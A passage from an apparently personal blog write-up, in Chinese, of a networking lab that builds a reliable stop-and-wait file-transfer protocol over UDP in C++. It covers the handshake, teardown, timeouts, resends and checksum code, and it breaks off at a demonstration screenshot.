class="hljs-keyword">define</span> FILE_HEAD 0x8</span><span class="hljs-comment">// datagram format:</span><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> pack(1)</span><span class="hljs-keyword">struct</span> <span class="hljs-title class_">packet_head</span> {    u_int seq;    u_short check_sum;    u_short data_size;    u_short flag;    u_short window_size;    u_int option;    <span class="hljs-built_in">packet_head</span>() {        seq = <span class="hljs-number">0</span>;        check_sum = <span class="hljs-number">0</span>;        data_size = <span class="hljs-number">0</span>;        flag = <span class="hljs-number">0</span>;        window_size = <span class="hljs-number">0</span>;        option = <span class="hljs-number">0</span>;    }};<span class="hljs-keyword">struct</span> <span class="hljs-title class_">packet</span> {    packet_head head;    <span class="hljs-type">char</span> data[MAX_SIZE]{};    <span class="hljs-built_in">packet</span>() {        <span class="hljs-built_in">packet_head</span>();        <span class="hljs-built_in">memset</span>(data, <span class="hljs-number">0</span>, MAX_SIZE);    }};<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> pack()</span></code></pre></div></div><p><code>#pragma pack(1)</code>用于指示结构体内容按1Byte对齐，以保证报文大小是我们期望的紧凑形式。</p><h4 id="建连和断连">建连和断连</h4><p>依然是注意到单向传输的特点，对握手和挥手的过程也进行了优化：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210905183149_434_20221119192018406166_865_image-20221119154308774.png" alt="image-20221119154308774"><figcaption aria-hidden="true">image-20221119154308774</figcaption></figure><p>左边是TCP三次握手的过程，右侧是我为本次实验设计的握手过程。</p><p>TCP第三次握手的目的是“server”需要知道“client”能够收到他的应答。这在server向client发送数据时是有必要的，而本次实验只要发送端知道接收端能发能收，就可以放心的向其发送文件，握手成功。</p><p>接收端在收到发送端的握手信息后就可以准备好接受文件了。此时接收端预料的应当是发送端发送文件信息。但是这时候如果发送端断线了，接收端显然不能干等着，否则在真实情景下完全可以发起类似SYN洪泛攻击的行为。因此我们需要设置定时器，如果在这段时间发送端没有任何信息发来，这时应当释放资源并退出。在此次实验中这个最大时间设置的是1min。</p><p>同时，虽然此次实验假设接收端向发送端发送数据丢包率为0，但是在实验中仍旧考虑了这种情况：如果接收端的ACK丢了，会发生什么情况？因此在接收端准备接受文件时，仍旧检查收到的是否是握手信息。如果是握手信息，那么重置上述提到的定时器，仍旧停留在等待文件信息的状态。</p><p>断连的过程和上述分析类似，也是只需要两次即可。</p><p>另外，不需要文件结束位的原因是因为接受者在得到文件信息的时候就知道文件大小，从而知道有几个数据包，什么时候结束。</p><h3 id="流程设计">流程设计</h3><p>程序支持一次建连发送多个文件。</p><h4 id="服务器">服务器</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210906609864_859_20221119192021770008_725_image-20221119162017409.png" alt="image-20221119162017409"><figcaption aria-hidden="true">image-20221119162017409</figcaption></figure><h4 id="客户端">客户端</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210911470073_495_20221119192117915929_703_image-20221119162044532.png" alt="image-20221119162044532"><figcaption aria-hidden="true">image-20221119162044532</figcaption></figure><p>发送文件数据时遵循rdt3.0的整个过程，也即，在这次实验中序列号暂时只用到0和1。</p><h2 id="程序代码解释">程序代码解释</h2><h3 id="文件发送过程">文件发送过程</h3><h5 id="发送端">发送端</h5><p>首先对照发送端的状态机进行分析： <img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210913988941_208_20221119192126693722_492_image-20221119162927049.png" alt="image-20221119162927049">程序中的函数名与状态机中名称基本一致，思路也非常清晰。主要的变动为把<code>waitACK0</code>和<code>waitACK1</code>合并到了函数中，而不是作为单独的状态出现。这样做的原因是由于握手和挥手阶段的等待过程和文件传输过程中完全一致，通过相同发代码能够将过程统一起来。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-kg4jy9lmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-kg4jy9lmrh9u6a"><pre><code class="hljs c++"><span class="hljs-keyword">while</span>(pkt_no&lt;pkt_total){    pkt_data_size=<span class="hljs-built_in">min</span>(MAX_SIZE,file_len-pkt_no*MAX_SIZE);    <span class="hljs-keyword">switch</span>(stage)    {        <span class="hljs-keyword">case</span> SEND0:        {            packet sndpkt = <span class="hljs-built_in">make_pkt</span>(DATA, <span class="hljs-number">0</span>, pkt_data_size, file_data + pkt_no * MAX_SIZE);            <span class="hljs-built_in">udt_send</span>(sndpkt);            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">wait_ACK0</span>(sndpkt)) {                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Failed when sending packet number "</span> + <span class="hljs-built_in">to_string</span>(pkt_no), ERR);                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;            }            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Sent packet number "</span> + <span class="hljs-built_in">to_string</span>(pkt_no)+<span class="hljs-string">" with seq 0"</span>, DEBUG);            pkt_no++;            stage = SEND1;            <span class="hljs-keyword">break</span>;        }        <span class="hljs-keyword">case</span> SEND1:        {            packet sndpkt = <span class="hljs-built_in">make_pkt</span>(DATA, <span class="hljs-number">1</span>, pkt_data_size, file_data + pkt_no * MAX_SIZE);            <span class="hljs-built_in">udt_send</span>(sndpkt);            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">wait_ACK1</span>(sndpkt)) {                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Failed when sending packet number "</span> + <span class="hljs-built_in">to_string</span>(pkt_no), ERR);                <span class="hljs-keyword">break</span>;            }            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Sent packet number "</span> + <span class="hljs-built_in">to_string</span>(pkt_no)+<span class="hljs-string">" with seq 1"</span>, DEBUG);            pkt_no++;            stage=SEND0;            <span class="hljs-keyword">break</span>;        }        <span class="hljs-keyword">default</span>:            <span class="hljs-keyword">break</span>;    }}</code></pre></div></div><p>下面是<code>waitACK</code>相关函数的实现，以<code>waitACK0</code>为例：</p><p>首先由于需要处理超时事件，发送端和接收端所有的·<code>socket</code>都是非阻塞状态的。对于发送端<code>while</code>条件中的<code>rdt_rcv</code>是非阻塞的，以便在循环内判断超时进行消息重发。当没有收到消息时返回0，收到消息时返回1。循环内的重发若超过一定次数（<code>MAX_RESEND_TIMES</code>,其值为10），便可认为接收端由于意外断连，不再向其发送消息，程序退出。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jta8x1lmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-jta8x1lmrh9u6a"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">wait_ACK0</span><span class="hljs-params">(packet sndpkt)</span> </span>{    <span class="hljs-type">int</span> resend_times = <span class="hljs-number">0</span>;    <span class="hljs-comment">//start a timer</span>    <span class="hljs-type">clock_t</span> start = <span class="hljs-built_in">clock</span>();    packet rcvpkt;    <span class="hljs-comment">//non-blocking receive here</span>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">rdt_rcv</span>(rcvpkt) || <span class="hljs-built_in">isACK</span>(rcvpkt, <span class="hljs-number">1</span>)||<span class="hljs-built_in">corrupt</span>(rcvpkt)) {        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">timeout</span>(start)) {            <span class="hljs-built_in">udt_send</span>(sndpkt);            start = <span class="hljs-built_in">clock</span>();            <span class="hljs-keyword">if</span> (resend_times &gt; MAX_RESEND_TIMES) {                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Resend times exceed the limit, there must be something wrong with the network"</span>, ERR);                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;            } <span class="hljs-keyword">else</span> {                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Resend packet with seq 0"</span>, WARNING);                resend_times++;            }        }        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isACK</span>(rcvpkt, <span class="hljs-number">1</span>)) {            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received ACK1, discard it"</span>, DEBUG);        }    }    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;}</code></pre></div></div><p><code>rdt_rcv(rcvpkt)</code>实现如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tuhsdjlmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-tuhsdjlmrh9u6a"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">rdt_rcv</span><span class="hljs-params">(packet &amp;packet1)</span> </span>{    <span class="hljs-type">int</span> len = <span class="hljs-built_in">sizeof</span>(addr_server);    <span class="hljs-type">int</span> ret = <span class="hljs-built_in">recvfrom</span>(socket_sender, (<span class="hljs-type">char</span> *) &amp;packet1, PACKET_SIZE, <span class="hljs-number">0</span>, (SOCKADDR *) &amp;addr_server, &amp;len);    <span class="hljs-keyword">if</span> (ret == SOCKET_ERROR) {        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    }    <span class="hljs-keyword">return</span> ret != <span class="hljs-number">0</span>;}</code></pre></div></div><h5 id="接收端">接收端</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210920305113_241_20221119192129767531_984_image-20221119163135874.png" alt="image-20221119163135874"><figcaption aria-hidden="true">image-20221119163135874</figcaption></figure><p>与发送端有所不同，这里的<code>rdt_rcv(rcvpkt)</code>是阻塞的，内含一个非阻塞的<code>recvfrom</code>进行循环接收。若超时（一分钟）仍未收到消息，认为发送端可能意外退出，跳出接收循环，并随后判断文件是否完整接收，以作退出之前的保存和清理工作。这样设计的原因也是在握手和挥手时不依赖其他条件的需要同样的操作，能够较好的统一起来。</p><p>其他部分与状态机中一致。在循环内部需要判断接收到的文件是否已经完全接受，若接受完毕保存文件并退出，准备继续接受下一个文件。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2lpj19lmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-2lpj19lmrh9u6a"><pre><code class="hljs c++"><span class="hljs-keyword">while</span> (<span class="hljs-built_in">rdt_rcv</span>(rcvpkt)) {    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">not_corrupt</span>(rcvpkt)) {        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">has_seq0</span>(rcvpkt)) {            <span class="hljs-keyword">if</span> (stage == WAIT0) {                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(pkt_no) + <span class="hljs-string">", with seq 0"</span>, DEBUG);                pkt_data_size = rcvpkt.head.data_size;                <span class="hljs-built_in">memcpy</span>(file_buffer + received_file_len, rcvpkt.data, pkt_data_size);                received_file_len += pkt_data_size;                packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK, <span class="hljs-number">0</span>);                <span class="hljs-built_in">udt_send</span>(sndpkt);                pkt_no++;                stage = WAIT1;            } <span class="hljs-keyword">else</span> {                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received a packet with seq 0, but we are waiting for seq 1"</span>, WARNING);                <span class="hljs-keyword">continue</span>;            }        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">has_seq1</span>(rcvpkt)) {            <span class="hljs-keyword">if</span> (stage == WAIT1) {                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(pkt_no) + <span class="hljs-string">", with seq 1"</span>, DEBUG);                pkt_data_size = rcvpkt.head.data_size;                <span class="hljs-built_in">memcpy</span>(file_buffer + received_file_len, rcvpkt.data, pkt_data_size);                received_file_len += pkt_data_size;                packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK, <span class="hljs-number">1</span>);                <span class="hljs-built_in">udt_send</span>(sndpkt);                pkt_no++;                stage = WAIT0;            } <span class="hljs-keyword">else</span> {                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received a packet with seq 1, but we are waiting for seq 0"</span>, WARNING);                <span class="hljs-keyword">continue</span>;            }        }    } <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received a corrupt packet"</span>, DEBUG);        <span class="hljs-keyword">continue</span>;    }    <span class="hljs-keyword">if</span> (received_file_len == file_size) {        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received file successfully"</span>, SUC);        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Time used: "</span> + <span class="hljs-built_in">to_string</span>(<span class="hljs-built_in">clock</span>() - single_file_start) + <span class="hljs-string">"ms"</span>, INFO);        <span class="hljs-comment">//write the file to disk</span>        string file_path = <span class="hljs-built_in">get_file_path</span>(file_name);        <span class="hljs-function">ofstream <span class="hljs-title">file</span><span class="hljs-params">(file_path, ios::binary)</span></span>;        <span class="hljs-keyword">if</span> (file.<span class="hljs-built_in">is_open</span>()) {            file.<span class="hljs-built_in">write</span>(file_buffer, file_size);            file.<span class="hljs-built_in">close</span>();            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"File saved to "</span> + file_path, SUC);            new_file_received = <span class="hljs-literal">true</span>;        } <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Failed to open file "</span> + file_path, ERR);        }        <span class="hljs-keyword">break</span>;    }}</code></pre></div></div><p><code>rdt_rcv(rcvpkt)</code>的实现如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7in877lmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-7in877lmrh9u6a"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">rdt_rcv</span><span class="hljs-params">(packet &amp;packet1)</span> </span>{    <span class="hljs-type">clock_t</span> wait_file_start = <span class="hljs-built_in">clock</span>();    <span class="hljs-comment">//non-blocking receive here</span>    <span class="hljs-type">int</span> ret = <span class="hljs-built_in">recvfrom</span>(socket_receiver, (<span class="hljs-type">char</span> *) &amp;packet1, PACKET_SIZE, <span class="hljs-number">0</span>, (SOCKADDR *) &amp;addr_server, &amp;addr_len);    <span class="hljs-keyword">while</span> (ret == SOCKET_ERROR || ret == <span class="hljs-number">0</span>) {        <span class="hljs-comment">//no packet received</span>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">wait_file_timeout</span>(wait_file_start)) {            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Timeout, no packet received"</span>, ERR);            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        }        ret = <span class="hljs-built_in">recvfrom</span>(socket_receiver, (<span class="hljs-type">char</span> *) &amp;packet1, PACKET_SIZE, <span class="hljs-number">0</span>, (SOCKADDR *) &amp;addr_server, &amp;addr_len);    }    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;}</code></pre></div></div><h3 id="握手和挥手过程">握手和挥手过程</h3><p>有了文件传输过程的分析，握手和挥手便很容易理解，因为实际上只是文件传输的特例。当然，由于握手和挥手的代码在传输之前完成，因此在编写代码时这一部分设计比较困难，后面完成传输过程时又对其进行了一些优化。</p><p>相比传输过程，握手和挥手主要是需要处理流程上的细节。</p><h4 id="握手">握手</h4><h5 id="发送端-1">发送端</h5><p>发送端握手很简单:把包发过去，等ACK，等不到就重发，重发多了就退出。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-i3danllmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-i3danllmrh9u6a"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">handshake</span><span class="hljs-params">()</span> </span>{    <span class="hljs-comment">//as the transmitting is single-direction, so we only need to "shake" two times</span>    packet sndpkt = <span class="hljs-built_in">make_pkt</span>(SYN);    <span class="hljs-built_in">udt_send</span>(sndpkt);    <span class="hljs-keyword">return</span> <span class="hljs-built_in">wait_SYN_ACK</span>();}</code></pre></div></div><h5 id="接收端-1">接收端</h5><p>接收端思路也很明确：“阻塞”等待发送端的握手信息（一分钟内等不到就退出），如果接收到就握手成功，收到错误的包（比如校验和错误）丢弃。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-glhvbwlmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-glhvbwlmrh9u6a"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">handshake</span><span class="hljs-params">()</span> </span>{    packet rcvpkt;    <span class="hljs-type">int</span> wrong_times = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Waiting for handshake"</span>, INFO);        <span class="hljs-comment">//blocking receive here</span>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">rdt_rcv</span>(rcvpkt)) {            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isSYN</span>(rcvpkt) &amp;&amp; <span class="hljs-built_in">not_corrupt</span>(rcvpkt)) {                packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK_SYN);                <span class="hljs-built_in">udt_send</span>(sndpkt);                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;            } <span class="hljs-keyword">else</span> {                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received wrong packet"</span>, ERR);                <span class="hljs-comment">//discard the packet and continue to wait</span>                <span class="hljs-keyword">if</span> (wrong_times &gt; MAX_WRONG_TIMES) {                    <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Wrong times exceed the limit, there must be something wrong with the network"</span>, ERR);                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;                } <span class="hljs-keyword">else</span> {                    wrong_times++;                    <span class="hljs-keyword">continue</span>;                }            }        }        <span class="hljs-keyword">else</span> {            <span class="hljs-comment">//timeout</span>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        }    }}</code></pre></div></div><h4 id="挥手">挥手</h4><p>由上面的流程图所示，挥手过程仅应当发生在文件传输的间隔中。每次等待用户传送新文件时，用户有两种选择：传或不传。若传则发送文件信息，不传发送挥手信息。不管如何，这时接收端一定处在等待接收文件信息的阶段。</p><h5 id="发送端-2">发送端</h5><p>用户没有给出文件名或者选择放弃传送，仅以第一种调用情况为例：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-a54ogwlmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-a54ogwlmrh9u6a"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (file_path.<span class="hljs-built_in">empty</span>()) {    <span class="hljs-comment">//close the connection</span>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bye_bye</span>();}</code></pre></div></div><p>挥手成功退出程序，流程结束。 </p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fttkdvlmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-fttkdvlmrh9u6a"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">bye_bye</span><span class="hljs-params">()</span> </span>{    <span class="hljs-comment">//send FIN</span>    packet sndpkt = <span class="hljs-built_in">make_pkt</span>(FIN);    <span class="hljs-built_in">udt_send</span>(sndpkt);    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">wait_FIN_ACK</span>()) {        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Failed to receive FIN ACK"</span>, ERR);        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    }    <span class="hljs-keyword">else</span>    {        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Connection closed elegantly, Task finished!"</span>, SUC);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    }}</code></pre></div></div><p></p><h5 id="接收端-2">接收端</h5><p>首先需要介绍接收端等待文件信息的逻辑。如一开始的流程图所示，这发生在握手刚完成或文件传输间隙。如果此时无响应，说明发送端异常退出，接收端也应当退出。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2sfm8olmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-2sfm8olmrh9u6a"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">ready_for_file</span>(file_name, file_size)) {    <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Exit because of no response"</span>,INFO);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p><code>ready_for_file</code>的设计：</p><p>首先为了方便状态机设计，约定传送文件信息的报文序列是1。成功收到消息返回ACK。若收到握手消息，通过递归调用达到重置计时的作用。</p><p>在此过程中若发送方发送挥手消息，给予回应并退出程序，流程结束。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bmsclblmrh9u6a"></i><span>C++</span><div class="collapse show" id="collapse-bmsclblmrh9u6a"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">ready_for_file</span><span class="hljs-params">(string &amp;file_name, <span class="hljs-type">int</span> &amp;file_size)</span> </span>{    packet rcvpkt;    <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Waiting for file info"</span>, INFO);    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">rdt_rcv</span>(rcvpkt)) {        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">has_seq1</span>(rcvpkt)) {            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"File name: "</span> + <span class="hljs-built_in">string</span>(rcvpkt.data), DEBUG);            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"File size: "</span> + <span class="hljs-built_in">to_string</span>(rcvpkt.head.option), DEBUG);            file_name = <span class="hljs-built_in">string</span>(rcvpkt.data);            file_size = rcvpkt.head.option;            string file_path = <span class="hljs-built_in">get_file_path</span>(file_name);            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"File will be saved to "</span> + file_path, DEBUG);            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Ready to receive files"</span>, SUC);            packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK, <span class="hljs-number">1</span>);            <span class="hljs-built_in">udt_send</span>(sndpkt);            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isSYN</span>(rcvpkt)) {            <span class="hljs-comment">//if the ack is lost, the sender will resend the SYN packet</span>            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received a SYN packet, reset the timer"</span>, WARNING);            <span class="hljs-comment">// wait for the file info again</span>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">ready_for_file</span>(file_name, file_size);        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isFIN</span>(rcvpkt)) {            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received a FIN packet, close the connection"</span>, SUC);            packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK_FIN);            <span class="hljs-built_in">udt_send</span>(sndpkt);            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        } <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received a wrong packet"</span>, ERR);            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        }    } <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Timeout when waiting for file info"</span>, ERR);        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    }}</code></pre></div></div><h3 id="其他工具类">其他工具类</h3><h4 id="校验和">校验和</h4><p>由于此次实验并没有要求可变ip和端口号，因此不必加入伪首部的校验。编写代码如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ze8hqdlmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-ze8hqdlmrh9u6a"><pre><code class="hljs c++"><span class="hljs-function">u_short <span class="hljs-title">check_sum</span><span class="hljs-params">(u_short *packet, <span class="hljs-type">int</span> packet_len)</span> </span>{    u_long sum = <span class="hljs-number">0</span>;    <span class="hljs-comment">// make 16 bit words adjacent</span>    <span class="hljs-type">int</span> count = (packet_len + <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>;    <span class="hljs-keyword">auto</span> *temp = <span class="hljs-keyword">new</span> u_short[count + <span class="hljs-number">1</span>];    <span class="hljs-built_in">memset</span>(temp, <span class="hljs-number">0</span>, count + <span class="hljs-number">1</span>);    <span class="hljs-built_in">memcpy</span>(temp, packet, packet_len);    <span class="hljs-keyword">while</span> (count--) {        sum += *temp++;        <span class="hljs-comment">//overflow carry</span>        <span class="hljs-keyword">if</span> (sum &amp; <span class="hljs-number">0xFFFF0000</span>) {            sum &amp;= <span class="hljs-number">0xFFFF</span>;            sum++;        }    }    <span class="hljs-comment">//complement</span>    <span class="hljs-keyword">return</span> ~(sum &amp; <span class="hljs-number">0xFFFF</span>);}</code></pre></div></div><p>校验方法： </p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ajv28dlmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-ajv28dlmrh9u6a"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">not_corrupt</span><span class="hljs-params">(packet &amp;p)</span> </span>{    <span class="hljs-keyword">return</span> <span class="hljs-built_in">check_sum</span>((u_short *) &amp;p, HEAD_SIZE + p.head.data_size) == <span class="hljs-number">0</span>;}</code></pre></div></div><p></p><h4 id="创建数据包">创建数据包</h4><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-13v4exlmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-13v4exlmrh9u6a"><pre><code class="hljs c++"><span class="hljs-function">packet <span class="hljs-title">make_pkt</span><span class="hljs-params">(u_int flag, u_int seq = <span class="hljs-number">0</span>, u_short data_size = <span class="hljs-number">0</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *data = <span class="hljs-literal">nullptr</span>, u_short window_size = <span class="hljs-number">0</span>,</span></span><span class="hljs-params"><span class="hljs-function">                u_int option = <span class="hljs-number">0</span>)</span> </span>{    packet pkt;    pkt.head.flag = flag;    pkt.head.seq = seq;    pkt.head.window_size = window_size;    pkt.head.data_size = data_size;    pkt.head.option = option;    <span class="hljs-keyword">if</span> (data != <span class="hljs-literal">nullptr</span>) {        <span class="hljs-built_in">memcpy</span>(pkt.data, data, data_size);    }    pkt.head.check_sum = <span class="hljs-built_in">check_sum</span>((u_short *) &amp;pkt, PACKET_SIZE);    <span class="hljs-keyword">return</span> pkt;}</code></pre></div></div><h2 id="程序演示">程序演示</h2><h3 id="建立连接">建立连接</h3><p>路由器设置：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210921560514_535_20221119192132716638_161_image-20221119185527966.png" alt="image-20221119185527966"><figcaption aria-hidden="true">image-20221119185527966</figcaption></figure><p>接收端开启的稍微晚一些，可以看到发送端有一些重发的握手包：</p><p>发送端：</p><figure><img 